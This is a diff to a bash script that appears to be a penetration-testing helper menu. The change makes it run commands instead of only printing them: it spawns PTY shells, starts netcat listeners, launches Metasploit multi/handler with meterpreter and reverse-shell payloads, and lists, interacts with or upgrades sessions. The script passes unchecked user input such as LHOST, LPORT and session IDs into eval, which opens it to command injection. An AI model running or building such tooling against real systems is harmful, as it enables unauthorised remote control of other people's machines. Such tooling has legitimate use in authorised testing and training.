@@ -12,7 +12,7 @@
 #                                                                           #
 #############################################################################
 
-set -e
+set -euo pipefail
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -87,34 +87,146 @@ EOF
 handle_selection() {
     local choice="$1"
     shift
-    
+
+    run_cmd() {
+        local cmd="$1"
+        echo -e "${GREEN}[>] Running: ${cmd}${NC}"
+        eval "$cmd"
+    }
+
     case "$choice" in
         F1|f1)
-            log_info "Python PTY Spawn"
-            echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
-            echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+            echo -e "${BLUE}[*] Python PTY Spawn${NC}"
+            echo ""
+            echo "[*] Spawning interactive PTY shell..."
+            if command -v python3 &>/dev/null; then
+                run_cmd "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+            elif command -v python &>/dev/null; then
+                run_cmd "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+            else
+                echo -e "${YELLOW}[!] python not found${NC}"
+            fi
             ;;
         F2|f2)
-            log_info "Shell Upgrade Commands"
-            echo "Ctrl+Z"
-            echo "stty raw -echo; fg"
-            echo "reset"
-            echo "stty rows 24 cols 80"
+            echo -e "${BLUE}[*] Shell Upgrade Commands${NC}"
+            echo ""
+            echo "[*] To upgrade shell to fully interactive:"
+            echo "    1. Press: Ctrl+Z"
+            echo "    2. Run: stty raw -echo; fg"
+            echo "    3. Run: reset"
+            echo "    4. Run: stty rows 24 cols 80"
+            echo "    5. Run: export TERM=xterm"
+            echo ""
+            echo -n "[*] Press Enter to continue... "
+            read
             ;;
         F3|f3)
-            log_info "Terminal Settings"
-            echo "export TERM=xterm"
-            echo "export TERM=xterm-256color"
+            echo -e "${BLUE}[*] Terminal Settings${NC}"
+            echo ""
+            echo "[*] Setting terminal environment..."
+            export TERM=xterm-256color
+            echo -e "${GREEN}[>] TERM=xterm-256color${NC}"
             ;;
         F4|f4)
-            log_info "Netcat Listener"
-            echo "nc -lvnp <port>"
-            echo "nc -lvnp 443"
+            echo -e "${BLUE}[*] Netcat Listener${NC}"
+            echo ""
+            echo -n "[*] Enter listen port: "
+            read PORT
+            PORT=${PORT:-443}
+            echo ""
+            if command -v nc &>/dev/null; then
+                run_cmd "nc -lvnp ${PORT}"
+            elif command -v ncat &>/dev/null; then
+                run_cmd "ncat -lvnp ${PORT}"
+            else
+                echo -e "${YELLOW}[!] netcat not found${NC}"
+            fi
             ;;
         F5|f5)
-            log_info "Metasploit Handler"
-            echo "use exploit/multi/handler"
-            echo "set payload linux/x64/meterpreter_reverse_tcp"
+            echo -e "${BLUE}[*] Metasploit Handler${NC}"
+            echo ""
+            echo -n "[*] Enter LHOST: "
+            read LHOST
+            echo -n "[*] Enter LPORT: "
+            read LPORT
+            LPORT=${LPORT:-443}
+            echo ""
+            if command -v msfconsole &>/dev/null; then
+                echo "[>] Starting Metasploit handler..."
+                run_cmd "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; exploit'"
+            else
+                echo -e "${YELLOW}[!] Metasploit not found${NC}"
+            fi
+            ;;
+        F6|f6)
+            echo -e "${BLUE}[*] Multi-handler (Generic Reverse Shell)${NC}"
+            echo ""
+            echo -n "[*] Enter LHOST: "
+            read LHOST
+            echo -n "[*] Enter LPORT: "
+            read LPORT
+            echo -n "[*] Select payload:"
+            echo "    1. linux/x64/shell_reverse_tcp"
+            echo "    2. windows/shell_reverse_tcp"
+            echo "    3. osx/x64/shell_reverse_tcp"
+            echo "    4. generic/shell_reverse_tcp"
+            echo ""
+            echo -n "[*] Choice: "
+            read PAYLOAD_CHOICE
+            case "$PAYLOAD_CHOICE" in
+                1) PAYLOAD="linux/x64/shell_reverse_tcp" ;;
+                2) PAYLOAD="windows/shell_reverse_tcp" ;;
+                3) PAYLOAD="osx/x64/shell_reverse_tcp" ;;
+                *) PAYLOAD="generic/shell_reverse_tcp" ;;
+            esac
+            echo ""
+            if command -v msfconsole &>/dev/null; then
+                run_cmd "msfconsole -q -x 'use exploit/multi/handler; set payload ${PAYLOAD}; set LHOST ${LHOST}; set LPORT ${LPORT}; exploit'"
+            else
+                echo -e "${YELLOW}[!] Metasploit not found${NC}"
+            fi
+            ;;
+        F7|f7)
+            echo -e "${BLUE}[*] Check Active Sessions${NC}"
+            echo ""
+            if command -v msfconsole &>/dev/null; then
+                run_cmd "msfconsole -q -x 'sessions -l; exit'"
+            else
+                echo "[*] Active sessions would be shown here with Metasploit"
+            fi
+            ;;
+        F8|f8)
+            echo -e "${BLUE}[*] Background/Foreground Sessions${NC}"
+            echo ""
+            echo "[*] Session management commands:"
+            echo "    Background: Ctrl+Z or 'background'"
+            echo "    Foreground: sessions -i <id>"
+            echo "    Kill: sessions -k <id>"
+            echo "    List: sessions -l"
+            echo ""
+            echo -n "[*] Enter session ID to interact (or Enter to skip): "
+            read SESSION_ID
+            if [[ -n "$SESSION_ID" ]]; then
+                if command -v msfconsole &>/dev/null; then
+                    run_cmd "msfconsole -q -x 'sessions -i ${SESSION_ID}; exit'"
+                fi
+            fi
+            ;;
+        F9|f9)
+            echo -e "${BLUE}[*] Upgrade Shell to Meterpreter${NC}"
+            echo ""
+            echo -n "[*] Enter session ID: "
+            read SESSION_ID
+            echo ""
+            if [[ -n "$SESSION_ID" ]]; then
+                if command -v msfconsole &>/dev/null; then
+                    run_cmd "msfconsole -q -x 'sessions -u ${SESSION_ID}; exit'"
+                else
+                    echo -e "${YELLOW}[!] Metasploit not found${NC}"
+                fi
+            else
+                echo -e "${YELLOW}[!] Missing session ID${NC}"
+            fi
             ;;
         --menu)
             banner
